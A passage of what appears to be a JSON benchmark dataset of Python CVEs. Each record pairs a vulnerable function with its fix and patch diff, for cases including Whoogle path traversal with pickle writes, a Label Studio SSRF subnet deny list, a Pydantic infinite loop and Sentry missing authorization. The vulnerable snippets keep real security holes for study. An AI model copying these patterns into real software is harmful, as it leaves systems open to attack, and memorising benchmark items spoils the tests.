    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2017-0360:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/trytond\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2017-0360/bin/python -m unittest trytond.tests.test_tools.ToolsTestCase.test_file_open_suffix\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2017-0360:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/trytond\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2017-0360/bin/python -m unittest trytond.tests.test_tools\n"
  },
  {
    "cve_id": "CVE-2024-22204",
    "cve_description": "Whoogle Search is a self-hosted metasearch engine. Versions 0.8.3 and prior have a limited file write vulnerability when the configuration options in Whoogle are enabled. The `config` function in `app/routes.py` does not validate the user-controlled `name` variable on line 447 and `config_data` variable on line 437. The `name` variable is insecurely concatenated in `os.path.join`, leading to path manipulation. The POST data from the `config_data` variable is saved with `pickle.dump` which leads to a limited file write. However, the data that is saved is earlier transformed into a dictionary and the `url` key value pair is added before the file is saved on the system. All in all, the issue allows us to save and overwrite files on the system that the application has permissions to, with a dictionary containing arbitrary data and the `url` key value, which is a limited file write. Version 0.8.4 contains a patch for this issue.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/benbusby/whoogle-search",
    "patch_url": [
      "https://github.com/benbusby/whoogle-search/commit/3a2e0b262e4a076a20416b45e6b6f23fd265aeda"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_324_1",
        "commit": "8830615",
        "file_path": "app/routes.py",
        "start_line": 419,
        "end_line": 452,
        "snippet": "def config():\n    config_disabled = (\n            app.config['CONFIG_DISABLE'] or\n            not valid_user_session(session))\n    if request.method == 'GET':\n        return json.dumps(g.user_config.__dict__)\n    elif request.method == 'PUT' and not config_disabled:\n        if 'name' in request.args:\n            config_pkl = os.path.join(\n                app.config['CONFIG_PATH'],\n                request.args.get('name'))\n            session['config'] = (pickle.load(open(config_pkl, 'rb'))\n                                 if os.path.exists(config_pkl)\n                                 else session['config'])\n            return json.dumps(session['config'])\n        else:\n            return json.dumps({})\n    elif not config_disabled:\n        config_data = request.form.to_dict()\n        if 'url' not in config_data or not config_data['url']:\n            config_data['url'] = g.user_config.url\n\n        # Save config by name to allow a user to easily load later\n        if 'name' in request.args:\n            pickle.dump(\n                config_data,\n                open(os.path.join(\n                    app.config['CONFIG_PATH'],\n                    request.args.get('name')), 'wb'))\n\n        session['config'] = config_data\n        return redirect(config_data['url'])\n    else:\n        return redirect(url_for('.index'), code=403)"
      },
      {
        "id": "vul_py_324_2",
        "commit": "8830615",
        "file_path": "app/routes.py",
        "start_line": 465,
        "end_line": 490,
        "snippet": "def element():\n    element_url = src_url = request.args.get('url')\n    if element_url.startswith('gAAAAA'):\n        try:\n            cipher_suite = Fernet(g.session_key)\n            src_url = cipher_suite.decrypt(element_url.encode()).decode()\n        except (InvalidSignature, InvalidToken) as e:\n            return render_template(\n                'error.html',\n                error_message=str(e)), 401\n\n    src_type = request.args.get('type')\n\n    try:\n        file_data = g.user_request.send(base_url=src_url).content\n        tmp_mem = io.BytesIO()\n        tmp_mem.write(file_data)\n        tmp_mem.seek(0)\n\n        return send_file(tmp_mem, mimetype=src_type)\n    except exceptions.RequestException:\n        pass\n\n    empty_gif = base64.b64decode(\n        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n    return send_file(io.BytesIO(empty_gif), mimetype='image/gif')"
      },
      {
        "id": "vul_py_324_3",
        "commit": "8830615",
        "file_path": "app/routes.py",
        "start_line": 496,
        "end_line": 557,
        "snippet": "def window():\n    target_url = request.args.get('location')\n    if target_url.startswith('gAAAAA'):\n        cipher_suite = Fernet(g.session_key)\n        target_url = cipher_suite.decrypt(target_url.encode()).decode()\n\n    content_filter = Filter(\n        g.session_key,\n        root_url=request.url_root,\n        config=g.user_config)\n    target = urlparse.urlparse(target_url)\n    host_url = f'{target.scheme}://{target.netloc}'\n\n    get_body = g.user_request.send(base_url=target_url).text\n\n    results = bsoup(get_body, 'html.parser')\n    src_attrs = ['src', 'href', 'srcset', 'data-srcset', 'data-src']\n\n    # Parse HTML response and replace relative links w/ absolute\n    for element in results.find_all():\n        for attr in src_attrs:\n            if not element.has_attr(attr) or not element[attr].startswith('/'):\n                continue\n\n            element[attr] = host_url + element[attr]\n\n    # Replace or remove javascript sources\n    for script in results.find_all('script', {'src': True}):\n        if 'nojs' in request.args:\n            script.decompose()\n        else:\n            content_filter.update_element_src(script, 'application/javascript')\n\n    # Replace all possible image attributes\n    img_sources = ['src', 'data-src', 'data-srcset', 'srcset']\n    for img in results.find_all('img'):\n        _ = [\n            content_filter.update_element_src(img, 'image/png', attr=_)\n            for _ in img_sources if img.has_attr(_)\n        ]\n\n    # Replace all stylesheet sources\n    for link in results.find_all('link', {'href': True}):\n        content_filter.update_element_src(link, 'text/css', attr='href')\n\n    # Use anonymous view for all links on page\n    for a in results.find_all('a', {'href': True}):\n        a['href'] = f'{Endpoint.window}?location=' + a['href'] + (\n            '&nojs=1' if 'nojs' in request.args else '')\n\n    # Remove all iframes -- these are commonly used inside of <noscript> tags\n    # to enforce loading Google Analytics\n    for iframe in results.find_all('iframe'):\n        iframe.decompose()\n\n    return render_template(\n        'display.html',\n        response=results,\n        translation=app.config['TRANSLATIONS'][\n            g.user_config.get_localization_lang()\n        ]\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_324_1",
        "commit": "3a2e0b262e4a076a20416b45e6b6f23fd265aeda",
        "file_path": "app/routes.py",
        "start_line": 421,
        "end_line": 459,
        "snippet": "def config():\n    config_disabled = (\n            app.config['CONFIG_DISABLE'] or\n            not valid_user_session(session))\n\n    name = ''\n    if 'name' in request.args:\n        name = os.path.normpath(request.args.get('name'))\n        if not re.match(r'^[A-Za-z0-9_.+-]+$', name):\n            return make_response('Invalid config name', 400)\n\n    if request.method == 'GET':\n        return json.dumps(g.user_config.__dict__)\n    elif request.method == 'PUT' and not config_disabled:\n        if name:\n            config_pkl = os.path.join(app.config['CONFIG_PATH'], name)\n            session['config'] = (pickle.load(open(config_pkl, 'rb'))\n                                 if os.path.exists(config_pkl)\n                                 else session['config'])\n            return json.dumps(session['config'])\n        else:\n            return json.dumps({})\n    elif not config_disabled:\n        config_data = request.form.to_dict()\n        if 'url' not in config_data or not config_data['url']:\n            config_data['url'] = g.user_config.url\n\n        # Save config by name to allow a user to easily load later\n        if 'name' in request.args:\n            pickle.dump(\n                config_data,\n                open(os.path.join(\n                    app.config['CONFIG_PATH'],\n                    name), 'wb'))\n\n        session['config'] = config_data\n        return redirect(config_data['url'])\n    else:\n        return redirect(url_for('.index'), code=403)"
      },
      {
        "id": "fix_py_324_2",
        "commit": "3a2e0b262e4a076a20416b45e6b6f23fd265aeda",
        "file_path": "app/routes.py",
        "start_line": 472,
        "end_line": 502,
        "snippet": "def element():\n    empty_gif = base64.b64decode(\n        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n    element_url = src_url = request.args.get('url')\n    if element_url.startswith('gAAAAA'):\n        try:\n            cipher_suite = Fernet(g.session_key)\n            src_url = cipher_suite.decrypt(element_url.encode()).decode()\n        except (InvalidSignature, InvalidToken) as e:\n            return render_template(\n                'error.html',\n                error_message=str(e)), 401\n\n    src_type = request.args.get('type')\n\n    # Ensure requested element is from a valid domain\n    domain = urlparse.urlparse(src_url).netloc\n    if not validators.domain(domain):\n        return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n\n    try:\n        file_data = g.user_request.send(base_url=src_url).content\n        tmp_mem = io.BytesIO()\n        tmp_mem.write(file_data)\n        tmp_mem.seek(0)\n\n        return send_file(tmp_mem, mimetype=src_type)\n    except exceptions.RequestException:\n        pass\n\n    return send_file(io.BytesIO(empty_gif), mimetype='image/gif')"
      },
      {
        "id": "fix_py_324_3",
        "commit": "3a2e0b262e4a076a20416b45e6b6f23fd265aeda",
        "file_path": "app/routes.py",
        "start_line": 496,
        "end_line": 557,
        "snippet": "        tmp_mem.seek(0)\n\n        return send_file(tmp_mem, mimetype=src_type)\n    except exceptions.RequestException:\n        pass\n\n    return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n\n\n@app.route(f'/{Endpoint.window}')\n@session_required\n@auth_required\ndef window():\n    target_url = request.args.get('location')\n    if target_url.startswith('gAAAAA'):\n        cipher_suite = Fernet(g.session_key)\n        target_url = cipher_suite.decrypt(target_url.encode()).decode()\n\n    content_filter = Filter(\n        g.session_key,\n        root_url=request.url_root,\n        config=g.user_config)\n    target = urlparse.urlparse(target_url)\n\n    # Ensure requested URL has a valid domain\n    if not validators.domain(target.netloc):\n        return render_template(\n            'error.html',\n            error_message='Invalid location'), 400\n\n    host_url = f'{target.scheme}://{target.netloc}'\n\n    get_body = g.user_request.send(base_url=target_url).text\n\n    results = bsoup(get_body, 'html.parser')\n    src_attrs = ['src', 'href', 'srcset', 'data-srcset', 'data-src']\n\n    # Parse HTML response and replace relative links w/ absolute\n    for element in results.find_all():\n        for attr in src_attrs:\n            if not element.has_attr(attr) or not element[attr].startswith('/'):\n                continue\n\n            element[attr] = host_url + element[attr]\n\n    # Replace or remove javascript sources\n    for script in results.find_all('script', {'src': True}):\n        if 'nojs' in request.args:\n            script.decompose()\n        else:\n            content_filter.update_element_src(script, 'application/javascript')\n\n    # Replace all possible image attributes\n    img_sources = ['src', 'data-src', 'data-srcset', 'srcset']\n    for img in results.find_all('img'):\n        _ = [\n            content_filter.update_element_src(img, 'image/png', attr=_)\n            for _ in img_sources if img.has_attr(_)\n        ]\n\n    # Replace all stylesheet sources\n    for link in results.find_all('link', {'href': True}):"
      }
    ],
    "vul_patch": "--- a/app/routes.py\n+++ b/app/routes.py\n@@ -2,13 +2,18 @@\n     config_disabled = (\n             app.config['CONFIG_DISABLE'] or\n             not valid_user_session(session))\n+\n+    name = ''\n+    if 'name' in request.args:\n+        name = os.path.normpath(request.args.get('name'))\n+        if not re.match(r'^[A-Za-z0-9_.+-]+$', name):\n+            return make_response('Invalid config name', 400)\n+\n     if request.method == 'GET':\n         return json.dumps(g.user_config.__dict__)\n     elif request.method == 'PUT' and not config_disabled:\n-        if 'name' in request.args:\n-            config_pkl = os.path.join(\n-                app.config['CONFIG_PATH'],\n-                request.args.get('name'))\n+        if name:\n+            config_pkl = os.path.join(app.config['CONFIG_PATH'], name)\n             session['config'] = (pickle.load(open(config_pkl, 'rb'))\n                                  if os.path.exists(config_pkl)\n                                  else session['config'])\n@@ -26,7 +31,7 @@\n                 config_data,\n                 open(os.path.join(\n                     app.config['CONFIG_PATH'],\n-                    request.args.get('name')), 'wb'))\n+                    name), 'wb'))\n \n         session['config'] = config_data\n         return redirect(config_data['url'])\n\n--- a/app/routes.py\n+++ b/app/routes.py\n@@ -1,4 +1,6 @@\n def element():\n+    empty_gif = base64.b64decode(\n+        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n     element_url = src_url = request.args.get('url')\n     if element_url.startswith('gAAAAA'):\n         try:\n@@ -11,6 +13,11 @@\n \n     src_type = request.args.get('type')\n \n+    # Ensure requested element is from a valid domain\n+    domain = urlparse.urlparse(src_url).netloc\n+    if not validators.domain(domain):\n+        return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n+\n     try:\n         file_data = g.user_request.send(base_url=src_url).content\n         tmp_mem = io.BytesIO()\n@@ -21,6 +28,4 @@\n     except exceptions.RequestException:\n         pass\n \n-    empty_gif = base64.b64decode(\n-        'R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==')\n     return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n\n--- a/app/routes.py\n+++ b/app/routes.py\n@@ -1,3 +1,15 @@\n+        tmp_mem.seek(0)\n+\n+        return send_file(tmp_mem, mimetype=src_type)\n+    except exceptions.RequestException:\n+        pass\n+\n+    return send_file(io.BytesIO(empty_gif), mimetype='image/gif')\n+\n+\n+@app.route(f'/{Endpoint.window}')\n+@session_required\n+@auth_required\n def window():\n     target_url = request.args.get('location')\n     if target_url.startswith('gAAAAA'):\n@@ -9,6 +21,13 @@\n         root_url=request.url_root,\n         config=g.user_config)\n     target = urlparse.urlparse(target_url)\n+\n+    # Ensure requested URL has a valid domain\n+    if not validators.domain(target.netloc):\n+        return render_template(\n+            'error.html',\n+            error_message='Invalid location'), 400\n+\n     host_url = f'{target.scheme}://{target.netloc}'\n \n     get_body = g.user_request.send(base_url=target_url).text\n@@ -41,22 +60,3 @@\n \n     # Replace all stylesheet sources\n     for link in results.find_all('link', {'href': True}):\n-        content_filter.update_element_src(link, 'text/css', attr='href')\n-\n-    # Use anonymous view for all links on page\n-    for a in results.find_all('a', {'href': True}):\n-        a['href'] = f'{Endpoint.window}?location=' + a['href'] + (\n-            '&nojs=1' if 'nojs' in request.args else '')\n-\n-    # Remove all iframes -- these are commonly used inside of <noscript> tags\n-    # to enforce loading Google Analytics\n-    for iframe in results.find_all('iframe'):\n-        iframe.decompose()\n-\n-    return render_template(\n-        'display.html',\n-        response=results,\n-        translation=app.config['TRANSLATIONS'][\n-            g.user_config.get_localization_lang()\n-        ]\n-    )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-47116",
    "cve_description": "Label Studio is a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to 1.11.0 and was tested on version 1.8.2. Label Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a DNS rebinding attack.",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/HumanSignal/label-studio",
    "patch_url": [
      "https://github.com/HumanSignal/label-studio/commit/55dd6af4716b92f2bb213fe461d1ffbc380c6a64"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_222_1",
        "commit": "f8b2fb8",
        "file_path": "label_studio/core/utils/io.py",
        "start_line": 199,
        "end_line": 217,
        "snippet": "def validate_ip(ip: str) -> None:\n    \"\"\"Checks if an IP is local/private.\n\n    :param ip: IP address to be checked.\n    \"\"\"\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_222_1",
        "commit": "55dd6af",
        "file_path": "label_studio/core/utils/io.py",
        "start_line": 199,
        "end_line": 254,
        "snippet": "def validate_ip(ip: str) -> None:\n    \"\"\"If settings.USE_DEFAULT_BANNED_SUBNETS is True, this function checks\n    if an IP is reserved for any of the reasons in\n    https://en.wikipedia.org/wiki/Reserved_IP_addresses\n    and raises an exception if so. Additionally, if settings.USER_ADDITIONAL_BANNED_SUBNETS\n    is set, it will also check against those subnets.\n\n    If settings.USE_DEFAULT_BANNED_SUBNETS is False, this function will only check\n    the IP against settings.USER_ADDITIONAL_BANNED_SUBNETS. Turning off the default\n    subnets is **risky** and should only be done if you know what you're doing.\n\n    :param ip: IP address to be checked.\n    \"\"\"\n\n    default_banned_subnets = [\n        '0.0.0.0/8',  # current network\n        '10.0.0.0/8',  # private network\n        '100.64.0.0/10',  # shared address space\n        '127.0.0.0/8',  # loopback\n        '169.254.0.0/16',  # link-local\n        '172.16.0.0/12',  # private network\n        '192.0.0.0/24',  # IETF protocol assignments\n        '192.0.2.0/24',  # TEST-NET-1\n        '192.88.99.0/24',  # Reserved, formerly ipv6 to ipv4 relay\n        '192.168.0.0/16',  # private network\n        '198.18.0.0/15',  # network interconnect device benchmark testing\n        '198.51.100.0/24',  # TEST-NET-2\n        '203.0.113.0/24',  # TEST-NET-3\n        '224.0.0.0/4',  # multicast\n        '233.252.0.0/24',  # MCAST-TEST-NET\n        '240.0.0.0/4',  # reserved for future use\n        '255.255.255.255/32',  # limited broadcast\n        '::/128',  # unspecified address\n        '::1/128',  # loopback\n        '::ffff:0:0/96',  # IPv4-mapped address\n        '::ffff:0:0:0/96',  # IPv4-translated address\n        '64:ff9b::/96',  # IPv4/IPv6 translation\n        '64:ff9b:1::/48',  # IPv4/IPv6 translation\n        '100::/64',  # discard prefix\n        '2001:0000::/32',  # Teredo tunneling\n        '2001:20::/28',  # ORCHIDv2\n        '2001:db8::/32',  # documentation\n        '2002::/16',  # 6to4\n        'fc00::/7',  # unique local\n        'fe80::/10',  # link-local\n        'ff00::/8',  # multicast\n    ]\n\n    banned_subnets = [\n        *(default_banned_subnets if settings.USE_DEFAULT_BANNED_SUBNETS else []),\n        *(settings.USER_ADDITIONAL_BANNED_SUBNETS or []),\n    ]\n\n    for subnet in banned_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError(f'URL resolves to a reserved network address (block: {subnet})')"
      }
    ],
    "vul_patch": "--- a/label_studio/core/utils/io.py\n+++ b/label_studio/core/utils/io.py\n@@ -1,19 +1,56 @@\n def validate_ip(ip: str) -> None:\n-    \"\"\"Checks if an IP is local/private.\n+    \"\"\"If settings.USE_DEFAULT_BANNED_SUBNETS is True, this function checks\n+    if an IP is reserved for any of the reasons in\n+    https://en.wikipedia.org/wiki/Reserved_IP_addresses\n+    and raises an exception if so. Additionally, if settings.USER_ADDITIONAL_BANNED_SUBNETS\n+    is set, it will also check against those subnets.\n+\n+    If settings.USE_DEFAULT_BANNED_SUBNETS is False, this function will only check\n+    the IP against settings.USER_ADDITIONAL_BANNED_SUBNETS. Turning off the default\n+    subnets is **risky** and should only be done if you know what you're doing.\n \n     :param ip: IP address to be checked.\n     \"\"\"\n \n-    if ip == '0.0.0.0':  # nosec\n-        raise InvalidUploadUrlError\n-\n-    local_subnets = [\n-        '127.0.0.0/8',\n-        '10.0.0.0/8',\n-        '172.16.0.0/12',\n-        '192.168.0.0/16',\n+    default_banned_subnets = [\n+        '0.0.0.0/8',  # current network\n+        '10.0.0.0/8',  # private network\n+        '100.64.0.0/10',  # shared address space\n+        '127.0.0.0/8',  # loopback\n+        '169.254.0.0/16',  # link-local\n+        '172.16.0.0/12',  # private network\n+        '192.0.0.0/24',  # IETF protocol assignments\n+        '192.0.2.0/24',  # TEST-NET-1\n+        '192.88.99.0/24',  # Reserved, formerly ipv6 to ipv4 relay\n+        '192.168.0.0/16',  # private network\n+        '198.18.0.0/15',  # network interconnect device benchmark testing\n+        '198.51.100.0/24',  # TEST-NET-2\n+        '203.0.113.0/24',  # TEST-NET-3\n+        '224.0.0.0/4',  # multicast\n+        '233.252.0.0/24',  # MCAST-TEST-NET\n+        '240.0.0.0/4',  # reserved for future use\n+        '255.255.255.255/32',  # limited broadcast\n+        '::/128',  # unspecified address\n+        '::1/128',  # loopback\n+        '::ffff:0:0/96',  # IPv4-mapped address\n+        '::ffff:0:0:0/96',  # IPv4-translated address\n+        '64:ff9b::/96',  # IPv4/IPv6 translation\n+        '64:ff9b:1::/48',  # IPv4/IPv6 translation\n+        '100::/64',  # discard prefix\n+        '2001:0000::/32',  # Teredo tunneling\n+        '2001:20::/28',  # ORCHIDv2\n+        '2001:db8::/32',  # documentation\n+        '2002::/16',  # 6to4\n+        'fc00::/7',  # unique local\n+        'fe80::/10',  # link-local\n+        'ff00::/8',  # multicast\n     ]\n \n-    for subnet in local_subnets:\n+    banned_subnets = [\n+        *(default_banned_subnets if settings.USE_DEFAULT_BANNED_SUBNETS else []),\n+        *(settings.USER_ADDITIONAL_BANNED_SUBNETS or []),\n+    ]\n+\n+    for subnet in banned_subnets:\n         if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n-            raise InvalidUploadUrlError\n+            raise InvalidUploadUrlError(f'URL resolves to a reserved network address (block: {subnet})')\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-29510",
    "cve_description": "Pydantic is a data validation and settings management using Python type hinting. In affected versions passing either `'infinity'`, `'inf'` or `float('inf')` (or their negatives) to `datetime` or `date` fields causes validation to run forever with 100% CPU usage (on one CPU). Pydantic has been patched with fixes available in the following versions: v1.8.2, v1.7.4, v1.6.2. All these versions are available on pypi(https://pypi.org/project/pydantic/#history), and will be available on conda-forge(https://anaconda.org/conda-forge/pydantic) soon. See the changelog(https://pydantic-docs.helpmanual.io/) for details. If you absolutely can't upgrade, you can work around this risk using a validator(https://pydantic-docs.helpmanual.io/usage/validators/) to catch these values. This is not an ideal solution (in particular you'll need a slightly different function for datetimes), instead of a hack like this you should upgrade pydantic. If you are not using v1.8.x, v1.7.x or v1.6.x and are unable to upgrade to a fixed version of pydantic, please create an issue at https://github.com/samuelcolvin/pydantic/issues requesting a back-port, and we will endeavour to release a patch for earlier versions of pydantic.",
    "cwe_info": {
      "CWE-835": {
        "name": "Loop with Unreachable Exit Condition ('Infinite Loop')",
        "description": "The product contains an iteration or loop with an exit condition that cannot be reached, i.e., an infinite loop."
      }
    },
    "repo": "https://github.com/samuelcolvin/pydantic",
    "patch_url": [
      "https://github.com/samuelcolvin/pydantic/commit/7e83fdd2563ffac081db7ecdf1affa65ef38c468"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_430_1",
        "commit": "a615451",
        "file_path": "pydantic/datetime_parse.py",
        "start_line": 75,
        "end_line": 79,
        "snippet": "def from_unix_seconds(seconds: Union[int, float]) -> datetime:\n    while abs(seconds) > MS_WATERSHED:\n        seconds /= 1000\n    dt = EPOCH + timedelta(seconds=seconds)\n    return dt.replace(tzinfo=timezone.utc)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_430_1",
        "commit": "7e83fdd2563ffac081db7ecdf1affa65ef38c468",
        "file_path": "pydantic/datetime_parse.py",
        "start_line": 77,
        "end_line": 86,
        "snippet": "def from_unix_seconds(seconds: Union[int, float]) -> datetime:\n    if seconds > MAX_NUMBER:\n        return datetime.max\n    elif seconds < -MAX_NUMBER:\n        return datetime.min\n\n    while abs(seconds) > MS_WATERSHED:\n        seconds /= 1000\n    dt = EPOCH + timedelta(seconds=seconds)\n    return dt.replace(tzinfo=timezone.utc)"
      },
      {
        "id": "fix_py_430_2",
        "commit": "7e83fdd2563ffac081db7ecdf1affa65ef38c468",
        "file_path": "pydantic/datetime_parse.py",
        "start_line": 61,
        "end_line": 62,
        "snippet": "# slightly more than datetime.max in ns - (datetime.max - EPOCH).total_seconds() * 1e9\nMAX_NUMBER = int(3e20)"
      }
    ],
    "vul_patch": "--- a/pydantic/datetime_parse.py\n+++ b/pydantic/datetime_parse.py\n@@ -1,4 +1,9 @@\n def from_unix_seconds(seconds: Union[int, float]) -> datetime:\n+    if seconds > MAX_NUMBER:\n+        return datetime.max\n+    elif seconds < -MAX_NUMBER:\n+        return datetime.min\n+\n     while abs(seconds) > MS_WATERSHED:\n         seconds /= 1000\n     dt = EPOCH + timedelta(seconds=seconds)\n\n--- /dev/null\n+++ b/pydantic/datetime_parse.py\n@@ -0,0 +1,2 @@\n+# slightly more than datetime.max in ns - (datetime.max - EPOCH).total_seconds() * 1e9\n+MAX_NUMBER = int(3e20)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-45605",
    "cve_description": "Sentry is a developer-first error tracking and performance monitoring platform. An authenticated user delete the user issue alert notifications for arbitrary users given a know alert ID. A patch was issued to ensure authorization checks are properly scoped on requests to delete user alert notifications. Sentry SaaS users do not need to take any action. Self-Hosted Sentry users should upgrade to version 24.9.0 or higher. There are no known workarounds for this vulnerability.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/getsentry/sentry",
    "patch_url": [
      "https://github.com/getsentry/sentry/commit/590258255bcb3a5fa4c56f21297b6c99131cfb9d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_410_1",
        "commit": "45ef94a2dd28ed506c4463e829f088ffec6d3fc0",
        "file_path": "src/sentry/api/endpoints/user_notification_settings_options_detail.py",
        "start_line": 22,
        "end_line": 31,
        "snippet": "    def delete(self, request: Request, user: User, notification_option_id: str) -> Response:\n        try:\n            option = NotificationSettingOption.objects.get(\n                id=notification_option_id,\n            )\n        except NotificationSettingOption.DoesNotExist:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n\n        option.delete()\n        return Response(status=status.HTTP_204_NO_CONTENT)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_410_1",
        "commit": "590258255bcb3a5fa4c56f21297b6c99131cfb9d",
        "file_path": "src/sentry/api/endpoints/user_notification_settings_options_detail.py",
        "start_line": 23,
        "end_line": 39,
        "snippet": "    def convert_args(\n        self,\n        request: Request,\n        user_id: int | str | None = None,\n        *args,\n        notification_option_id: int,\n        **kwargs,\n    ):\n        args, kwargs = super().convert_args(request, user_id, *args, **kwargs)\n        user = kwargs[\"user\"]\n        try:\n            option = NotificationSettingOption.objects.get(id=notification_option_id, user=user)\n        except NotificationSettingOption.DoesNotExist:\n            raise NotFound(detail=\"User notification setting does not exist\")\n\n        kwargs[\"notification_setting_option\"] = option\n        return args, kwargs"
      },
      {
        "id": "fix_py_410_2",
        "commit": "590258255bcb3a5fa4c56f21297b6c99131cfb9d",
        "file_path": "src/sentry/api/endpoints/user_notification_settings_options_detail.py",
        "start_line": 41,
        "end_line": 45,
        "snippet": "    def delete(\n        self, request: Request, user: User, notification_setting_option: NotificationSettingOption\n    ) -> Response:\n        notification_setting_option.delete()\n        return Response(status=status.HTTP_204_NO_CONTENT)"
      }
    ],
    "vul_patch": "--- a/src/sentry/api/endpoints/user_notification_settings_options_detail.py\n+++ b/src/sentry/api/endpoints/user_notification_settings_options_detail.py\n@@ -1,10 +1,17 @@\n-    def delete(self, request: Request, user: User, notification_option_id: str) -> Response:\n+    def convert_args(\n+        self,\n+        request: Request,\n+        user_id: int | str | None = None,\n+        *args,\n+        notification_option_id: int,\n+        **kwargs,\n+    ):\n+        args, kwargs = super().convert_args(request, user_id, *args, **kwargs)\n+        user = kwargs[\"user\"]\n         try:\n-            option = NotificationSettingOption.objects.get(\n-                id=notification_option_id,\n-            )\n+            option = NotificationSettingOption.objects.get(id=notification_option_id, user=user)\n         except NotificationSettingOption.DoesNotExist:\n-            return Response(status=status.HTTP_404_NOT_FOUND)\n+            raise NotFound(detail=\"User notification setting does not exist\")\n \n-        option.delete()\n-        return Response(status=status.HTTP_204_NO_CONTENT)\n+        kwargs[\"notification_setting_option\"] = option\n+        return args, kwargs\n\n--- /dev/null\n+++ b/src/sentry/api/endpoints/user_notification_settings_options_detail.py\n@@ -0,0 +1,5 @@\n+    def delete(\n+        self, request: Request, user: User, notification_setting_option: NotificationSettingOption\n+    ) -> Response:\n+        notification_setting_option.delete()\n+        return Response(status=status.HTTP_204_NO_CONTENT)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0273",
    "cve_description": "Improper Access Control in Pypi calibreweb prior to 0.6.16.",
    "cwe_info": {
      "CWE-284": {
        "name": "Improper Access Control",
        "description": "The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor."
      }
    },
    "repo": "https://github.com/janeczku/calibre-web",
    "patch_url": [
      "https://github.com/janeczku/calibre-web/commit/0c0313f375bed7b035c8c0482bbb09599e16bfcf"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_278_1",
        "commit": "6bf0753",
        "file_path": "cps/shelf.py",
        "start_line": 243,
        "end_line": 289,
        "snippet": "def create_edit_shelf(shelf, page_title, page, shelf_id=False):\n    sync_only_selected_shelves = current_user.kobo_only_shelves_sync\n    # calibre_db.session.query(ub.Shelf).filter(ub.Shelf.user_id == current_user.id).filter(ub.Shelf.kobo_sync).count()\n    if request.method == \"POST\":\n        to_save = request.form.to_dict()\n        if not current_user.role_edit_shelfs() and to_save.get(\"is_public\") == \"on\":\n            flash(_(u\"Sorry you are not allowed to create a public shelf\"), category=\"error\")\n            return redirect(url_for('web.index'))\n        is_public = 1 if to_save.get(\"is_public\") else 0\n        if config.config_kobo_sync:\n            shelf.kobo_sync = True if to_save.get(\"kobo_sync\") else False\n            if shelf.kobo_sync:\n                ub.session.query(ub.ShelfArchive).filter(ub.ShelfArchive.user_id == current_user.id).filter(\n                    ub.ShelfArchive.uuid == shelf.uuid).delete()\n                ub.session_commit()\n        shelf_title = to_save.get(\"title\", \"\")\n        if check_shelf_is_unique(shelf, shelf_title, is_public, shelf_id):\n            shelf.name = 